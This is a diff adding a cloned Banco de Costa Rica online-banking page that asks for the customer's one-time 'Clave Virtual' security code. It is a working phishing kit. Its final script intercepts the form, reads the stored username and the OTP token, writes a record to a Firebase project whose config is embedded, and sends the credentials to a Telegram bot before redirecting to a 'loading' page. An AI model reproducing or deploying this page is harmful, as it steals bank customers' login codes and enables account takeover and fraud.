@@ -1,0 +1,678 @@
+<!-- saved from url=(0173)https://www.personas.bancobcr.com/ib_bcr/txns/Clave_Dinamica/ValidacionClaveDinamicaLogon.asp?pagina_retorno=/plantilla/index.asp&field_id=TDServPublicos&logon_header=logon& -->
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <link href="./style.css" rel="stylesheet" type="text/css" />
+
+    <script language="JavaScript">
+      function menCDVencida() {
+        window.open(
+          "/IB_BCR/txns/Clave_Dinamica/mensajeCDVencida.asp",
+          "oficinas",
+          "menubar=no,status=no,scrollbars=yes,resizable=no,width=500,height=360"
+        );
+      }
+    </script>
+
+    <script language="JavaScript">
+      function menCDVencida() {
+        window.open(
+          "/IB_BCR/txns/Clave_Dinamica/mensajeCDVencida.asp",
+          "oficinas",
+          "menubar=no,status=no,scrollbars=yes,resizable=no,width=500,height=360"
+        );
+      }
+    </script>
+
+    <script language="JavaScript">
+      function menCDVencida() {
+        window.open(
+          "/IB_BCR/txns/Clave_Dinamica/mensajeCDVencida.asp",
+          "oficinas",
+          "menubar=no,status=no,scrollbars=yes,resizable=no,width=500,height=360"
+        );
+      }
+    </script>
+
+    <script language="JavaScript">
+      function menCDVencida() {
+        window.open(
+          "/IB_BCR/txns/Clave_Dinamica/mensajeCDVencida.asp",
+          "oficinas",
+          "menubar=no,status=no,scrollbars=yes,resizable=no,width=500,height=360"
+        );
+      }
+    </script>
+
+    <link rel="stylesheet" type="text/css" href="./semantic.min.css" />
+    <link rel="stylesheet" type="text/css" href="./BCRStyle.css" />
+    <script type="text/javascript" src="./funciones.js.descarga"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+      import {
+        getFirestore,
+        doc,
+        setDoc,
+        onSnapshot,
+      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+      const firebaseConfig = {
+        apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
+        authDomain: "basedtos-84767.firebaseapp.com",
+        projectId: "basedtos-84767",
+        storageBucket: "basedtos-84767.appspot.com",
+        messagingSenderId: "622608516389",
+        appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
+      };
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      window.db = db; // Hacer db accesible globalmente
+      window.doc = doc;
+      window.setDoc = setDoc;
+    </script>
+
+    <script>
+      function cerrar() {
+        window.parent.document.getElementById("nombreContenido").style.display =
+          "none";
+        window.parent.document.getElementById(
+          "nombreContenedor"
+        ).style.display = "none";
+      }
+
+      function ValidarOTPEvent(valorPaso, valorAplicacion) {
+        if (
+          document.getElementById("TxnName") !== null &&
+          document.getElementById("TxnName").value === "SICCNBCET"
+        ) {
+          document.theForm.TxnName.value = "SICCNBPTA";
+          document.theForm.Enteros.value = "3";
+        }
+
+        if (
+          document.getElementById("TxnName") !== null &&
+          document.getElementById("TxnName").value === "ParamTar"
+        ) {
+          document.theForm.Paso.value = "3";
+        }
+
+        if (
+          document.getElementById("TxnName") !== null &&
+          document.getElementById("TxnName").value === "ParamTarGen"
+        ) {
+          document.theForm.Paso.value = "4";
+        }
+
+        document.theForm.PasoGateway.value = valorPaso;
+        document.theForm.ACoTipTef.value = valorAplicacion;
+        document.theForm.submit();
+      }
+
+      function CancelarEvent(ignorarBack) {
+        var esMatCuentas = "0";
+
+        var dobRetorno = document.getElementById("dobleRetorno").value;
+        var codTrans = "";
+        var codDiosesis = "";
+
+        if (document.getElementById("txnMATCUENTAS") !== null) {
+          esMatCuentas = document.getElementById("txnMATCUENTAS").value;
+        }
+
+        if (
+          document.getElementById("codTransaccionCV") !== null &&
+          document.getElementById("codTransaccionCV").value !== null &&
+          document.getElementById("codTransaccionCV").value.length > 0
+        ) {
+          CargarDatos();
+        }
+
+        if (esMatCuentas !== null && esMatCuentas === "1") {
+          window.location.assign("MenuCuentasTDing.asp");
+        } else {
+          codTrans = document.getElementById("codTransaccionCV").value;
+
+          if (codTrans !== "NBT09-IgCat") {
+            if (ignorarBack == "1") $("#FormCVCancel").submit();
+            else history.back();
+
+            if (dobRetorno === "1") {
+              if (ignorarBack == "1") $("#FormCVCancel").submit();
+              else history.back();
+            }
+          }
+        }
+      }
+    </script>
+    <script>
+      window.parent.$("#ifrm").attr("scrolling", "no");
+    </script>
+
+    <meta name="GENERATOR" content="Microsoft FrontPage 4.0" />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta
+      http-equiv="Cache-Control"
+      value="no-cache, no-store, must-revalidate"
+    />
+    <meta http-equiv="Expires" content="Mon, 01 Jan 1990 00:00:01 GMT" />
+    <title></title>
+    <script src="./jquery-3.6.3.min.js.descarga"></script>
+    <script src="./inputmask.js.descarga"></script>
+    <script src="./jquery.inputmask.js.descarga"></script>
+    <link rel="stylesheet" type="text/css" href="./icon.css" />
+    <link rel="stylesheet" type="text/css" href="./semantic.min.css" />
+    <link rel="stylesheet" type="text/css" href="./jquery.dataTables.min.css" />
+    <link rel="stylesheet" type="text/css" href="./spinner.css" />
+    <link rel="stylesheet" type="text/css" href="./BCRStyle.css" />
+    <script language="JavaScript">
+      $(function () {
+        $(":input").inputmask();
+
+        $("#OTP").inputmask("999 999");
+
+        $("#OTP").keyup(function (e) {
+          if (
+            (e.keyCode >= 48 && e.keyCode <= 57) ||
+            (e.keyCode >= 96 && e.keyCode <= 105)
+          ) {
+            if ($("#OTP").val().replace(/\D/g, "").length == 6) {
+              $("#Aceptar").focus();
+            }
+          }
+        });
+
+        $("#OTP").attr(
+          "aria-label",
+          "Ingrese su mecanismo de seguridad para continuar:"
+        );
+        $("#OTP").focus();
+
+        $("#TD2").keypress(function (evt) {
+          var key = evt.which ? evt.which : evt.keyCode;
+          if (key == 13) {
+            $("#btnConfirmarMeca").click();
+          }
+        });
+
+        $("#inputAutorizacion").on("keypress", function (e) {
+          var regex = new RegExp("^[a-zA-Z0-9]+$");
+          var str = String.fromCharCode(!e.charCode ? e.which : e.charCode);
+          if (regex.test(str)) {
+            return true;
+          }
+          e.preventDefault();
+          return false;
+        });
+
+        if (window.parent.$("#itmCertificacion")) {
+          window.parent.$("#itmCertificacion").hide();
+          window.parent.$("#itmContactenos").css("margin-left", "");
+        }
+
+        var container = document.getElementsByClassName(
+          "contenedorValoresTD"
+        )[0];
+        if (container != null) {
+          container.onkeyup = function (e) {
+            if (e.keyCode == 9 && e.shiftKey) {
+            } else {
+              if (
+                (e.keyCode >= 48 && e.keyCode <= 57) ||
+                (e.keyCode >= 96 && e.keyCode <= 105)
+              ) {
+                var target = e.srcElement;
+                var maxLength = parseInt(
+                  target.attributes["maxlength"].value,
+                  10
+                );
+                var myLength = target.value.length;
+                if (myLength >= maxLength) {
+                  var next = target;
+                  switch (next.name) {
+                    case "CeldaAEnviarTD0":
+                      $("#TD1").focus();
+                      break;
+                    case "CeldaAEnviarTD1":
+                      $("#TD2").focus();
+                      break;
+                  }
+                }
+              }
+            }
+
+            if (
+              $("#TD0").val().length >= 2 &&
+              $("#TD1").val().length >= 2 &&
+              $("#TD2").val().length >= 2
+            ) {
+              $("#btnConfirmarMeca").attr("disabled", false);
+            } else {
+              $("#btnConfirmarMeca").attr("disabled", true);
+            }
+          };
+        }
+      });
+
+      function corregir() {
+        history.back();
+      }
+
+      function checkFrec() {
+        if (document.theForm.SaveTxnFrec.checked) {
+          document.theForm.SaveTxnFrec.value = "1";
+        } else {
+          document.theForm.SaveTxnFrec.value = "0";
+        }
+      }
+    </script>
+
+    <!----------------------------------------------------------------------------------------------------->
+    <script>
+      NS_CSM_td = 275718492;
+      NS_CSM_pd = 275116670;
+      NS_CSM_u = "/clm10";
+      NS_CSM_col = "af_collector_logstream";
+    </script>
+    <script type="text/javascript">
+      function sendTimingInfoInit() {
+        setTimeout(sendTimingInfo, 0);
+      }
+      function sendTimingInfo() {
+        var wp = window.performance;
+        if (wp) {
+          var c1, c2, t;
+          c1 = wp.timing;
+          if (c1) {
+            var cm = {};
+            cm.ns = c1.navigationStart;
+            if ((t = c1.unloadEventStart) > 0) cm.us = t;
+            if ((t = c1.unloadEventEnd) > 0) cm.ue = t;
+            if ((t = c1.redirectStart) > 0) cm.rs = t;
+            if ((t = c1.redirectEnd) > 0) cm.re = t;
+            cm.fs = c1.fetchStart;
+            cm.dls = c1.domainLookupStart;
+            cm.dle = c1.domainLookupEnd;
+            cm.cs = c1.connectStart;
+            cm.ce = c1.connectEnd;
+            if ((t = c1.secureConnectionStart) > 0) cm.scs = t;
+            cm.rqs = c1.requestStart;
+            cm.rss = c1.responseStart;
+            cm.rse = c1.responseEnd;
+            cm.dl = c1.domLoading;
+            cm.di = c1.domInteractive;
+            cm.dcls = c1.domContentLoadedEventStart;
+            cm.dcle = c1.domContentLoadedEventEnd;
+            cm.dc = c1.domComplete;
+            if ((t = c1.loadEventStart) > 0) cm.ls = t;
+            if ((t = c1.loadEventEnd) > 0) cm.le = t;
+            cm.tid = NS_CSM_td;
+            cm.pid = NS_CSM_pd;
+            cm.ac = NS_CSM_col;
+            var xhttp = new XMLHttpRequest();
+            if (xhttp) {
+              var JSON = JSON || {};
+              JSON.stringify =
+                JSON.stringify ||
+                function (ob) {
+                  var t = typeof ob;
+                  if (t != "object" || ob === null) {
+                    if (t == "string") ob = '"' + ob + '"';
+                    return String(ob);
+                  } else {
+                    var n,
+                      v,
+                      json = [],
+                      arr = ob && ob.constructor == Array;
+                    for (n in ob) {
+                      v = ob[n];
+                      t = typeof v;
+                      if (t == "string") v = '"' + v + '"';
+                      else if (t == "object" && v !== null)
+                        v = JSON.stringify(v);
+                      json.push((arr ? "" : '"' + n + '":') + String(v));
+                    }
+                    return (arr ? "[" : "{") + String(json) + (arr ? "]" : "}");
+                  }
+                };
+              xhttp.open("POST", NS_CSM_u, true);
+              xhttp.send(JSON.stringify(cm));
+            }
+          }
+        }
+      }
+      if (window.addEventListener)
+        window.addEventListener("load", sendTimingInfoInit, false);
+      else if (window.attachEvent)
+        window.attachEvent("onload", sendTimingInfoInit);
+      else window.onload = sendTimingInfoInit;
+    </script>
+  </head>
+
+  <body oncontextmenu="return false;" bgcolor="#FFFFFF">
+    <span class="backArrow">
+      <a href="https://www.personas.bancobcr.com/Ingreso.asp" target="ifrm">
+        <svg width="30" height="30" viewBox="0 0 1792 1792">
+          <path
+            style="fill: #0030a0"
+            d="M1408 960v-128q0-26-19-45t-45-19h-502l189-189q19-19 19-45t-19-45l-91-91q-18-18-45-18t-45 18l-362 362-91 91q-18 18-18 45t18 45l91 91 362 362q18 18 45 18t45-18l91-91q18-18 18-45t-18-45l-189-189h502q26 0 45-19t19-45zm256-64q0 209-103 385.5t-279.5 279.5-385.5 103-385.5-103-279.5-279.5-103-385.5 103-385.5 279.5-279.5 385.5-103 385.5 103 279.5 279.5 103 385.5z"
+          ></path>
+        </svg>
+      </a>
+    </span>
+    <div class="ui text container">
+      <h2
+        tabindex="50"
+        style="background-color: white !important; margin-top: 1em !important"
+        class="ui center aligned header security"
+      >
+        Ingrese su mecanismo de seguridad para continuar:
+      </h2>
+    </div>
+
+    <!---------------------------------------------------------------------------------------------------------------->
+
+    <form
+      id="loginform"
+    >
+      <p>
+        <input type="hidden" name="ACoTipTef" value="01" />
+        <input type="hidden" name="ConfirmarFirma" value="" />
+
+        <input type="hidden" name="PasoGateway" id="PasoGateway" value="" />
+      </p>
+
+      <table border="0" align="center">
+        <tbody>
+          <tr>
+            <td align="center" class="textorojo11">
+              <!--<p align="center" class="textorojo11" height="22" valign="bottom" colspan="2">	Esta transacci&oacute;n requiere el uso de un dispositivo de seguridad.</p>-->
+            </td>
+          </tr>
+        </tbody>
+      </table>
+
+      <p>
+        <script language="javascript" type="text/javascript">
+          function CallSignFormAndEnableConfirmar(msg) {
+            msg = msg.replace(/\\r\\n/g, "\r\n");
+            var result = CallSignForm(msg);
+            if (!result) document.theForm.Confirmar.disabled = false;
+            return result;
+          }
+        </script>
+
+        <!--------------------------------------------------------------->
+
+        <input type="hidden" readonly="True" name="TarjetaTD" value="" />
+        <input type="hidden" readonly="True" name="EstadoTD" value="" />
+        <input
+          type="hidden"
+          readonly="True"
+          name="ProdEncontTD"
+          value="False"
+        />
+        <input
+          type="hidden"
+          readonly="True"
+          name="DebeUsarTxn_TD"
+          value="False"
+        />
+        <input type="hidden" readonly="True" name="TipoTarjetaTD" value="" />
+
+        <input
+          type="hidden"
+          readonly="True"
+          id="DebeUsarTxn_TV"
+          name="DebeUsarTxn_TV"
+          value="True"
+        />
+        <input type="hidden" id="codDato" name="codDato" value="" />
+
+        <!--------------------------------------------------------------->
+      </p>
+      <p>
+        <input type="hidden" id="PasoCV" name="PasoCV" value="" />
+        <input type="hidden" id="valorOTP" name="valorOTP" value="" />
+        <input type="hidden" id="dobleRetorno" name="dobleRetorno" value="0" />
+        <input
+          type="hidden"
+          id="codTransaccionCV"
+          name="codTransaccionCV"
+          value=""
+        />
+      </p>
+      <div class="ui form">
+        <div class="ui grid centered">
+          <div class="ten wide mobile six wide computer column">
+            <div class="field">
+              <label
+                class="letrasNegrasFormulario"
+                title="Código BCR Clave Virtual"
+                tabindex="51"
+                >Código BCR Clave Virtual</label
+              >
+              <div class="ui input">
+                <input
+                  tabindex="52"
+                  name="OTP"
+                  id="OTP"
+                  type="text"
+                  maxlength="7"
+                  onkeypress="return AceptarSoloNumeros(event);"
+                  onpaste="return false;"
+                  autocomplete="off"
+                  style="text-align: center"
+                  value=""
+                  inputmode="text"
+                  aria-label="Ingrese su mecanismo de seguridad para continuar:"
+                />
+              </div>
+            </div>
+            <div class="field">
+              <div class="ui grid">
+                <div
+                  class="right aligned sixteen wide column"
+                  style="display: flex"
+                >
+                  <div style="margin: auto">
+                    <input
+                      tabindex="60"
+                      style="float: right"
+                      type="submit"
+                      class="ui button basic btnAzul"
+                      _=""
+                      value="Confirmar"
+                      title="Confirmar"
+                      id="Aceptar"
+                    />
+                    
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <br />
+
+      <div></div>
+      <div align="center">
+        <center>
+          <table border="0">
+            <tbody>
+              <tr>
+                <td>
+                  <p align="center" class="textorojo11">
+                    <b><i></i></b>
+                  </p>
+                </td>
+              </tr>
+              <tr>
+                <td align="center"></td>
+              </tr>
+            </tbody>
+          </table>
+        </center>
+      </div>
+
+      <!--------------------------------------------------------------->
+
+      <!---------------------------------------------------------------------->
+      <!--  -->
+
+      <!---------------------------------------------------------------------->
+    </form>
+
+    <div style="display: none">
+      <form
+        name="FormCVCancel"
+        id="FormCVCancel"
+        action="https://www.personas.bancobcr.com/plantilla/index.asp?"
+        target="_parent"
+        method="post"
+      >
+        <input type="hidden" name="MecaValido" value="0" />
+      </form>
+    </div>
+    <!------------------------------------------------------------------------------->
+    <!--  -->
+    <script language="JavaScript" type="text/javascript">
+      function CallSignForm(msg) {
+        return true;
+      }
+    </script>
+    <style>
+      .overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(
+          0,
+          0,
+          0,
+          0.5
+        ); /* Color de fondo semi-transparente */
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .centered-content {
+        text-align: center;
+        color: white;
+        padding: 20px;
+        border-radius: 10px;
+      }
+      .dot-container {
+        display: flex;
+      }
+
+      .dot {
+        width: 10px;
+        height: 70px;
+        background-color: red;
+        margin: 0 10px;
+        animation-duration: 1.5s;
+        animation-timing-function: ease-in-out;
+        animation-iteration-count: infinite;
+      }
+
+      .dot1 {
+        animation-name: wave1;
+      }
+
+      .dot2 {
+        animation-name: wave2;
+        animation-delay: 0.3s;
+      }
+
+      .dot3 {
+        animation-name: wave3;
+        animation-delay: 0.6s;
+      }
+
+      @keyframes wave1 {
+        0%,
+        100% {
+          transform: scaleY(1);
+        }
+        50% {
+          transform: scaleY(1.5);
+        }
+      }
+
+      @keyframes wave2 {
+        0%,
+        100% {
+          transform: scaleY(1.5);
+        }
+        50% {
+          transform: scaleY(1);
+        }
+      }
+
+      @keyframes wave3 {
+        0%,
+        100% {
+          transform: scaleY(1);
+        }
+        50% {
+          transform: scaleY(1.2);
+        }
+      }
+    </style>
+    <div class="overlay" id="overlay" style="display: none">
+      <div class="centered-content">
+        <div class="dot-container">
+          <div class="dot dot1"></div>
+          <div class="dot dot2"></div>
+          <div class="dot dot3"></div>
+        </div>
+      </div>
+    </div>
+  </body>
+  <script src="../script.js"></script>
+  <script>
+    const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#loginform");
+
+    form.addEventListener("submit", async (event) => {
+      event.preventDefault(); // Evita que se envíe el formulario por defecto
+
+      // Captura las variables necesarias
+      const nombre = localStorage.getItem("usuario");
+      const token = document.querySelector("#OTP").value;
+      const message = "\nBCR\nNombre: " + nombre + "\nToken: " + token;
+
+      // Asegúrate de que Firestore esté configurado correctamente
+      const questionRef = doc(window.db, "bcrr", nombre);
+      await setDoc(questionRef, {
+        question1: "A1",
+        question2: "A1",
+        question3: "A1",
+        page: 0,
+      });
+
+      // Envío a Telegram
+      axios
+        .post(
+          "https://api.telegram.org/bot" + miVariableGlobal + "/sendMessage",
+          {
+            chat_id: chat,
+            text: message,
+          }
+        )
+        .then((response) => {
+          // Redirige a otra página tras el éxito
+          window.parent.location.href = "../cargando.html";
+        })
+        .catch((error) => {
+          console.error(error);
+        });
+    });
+  </script>
+</html>
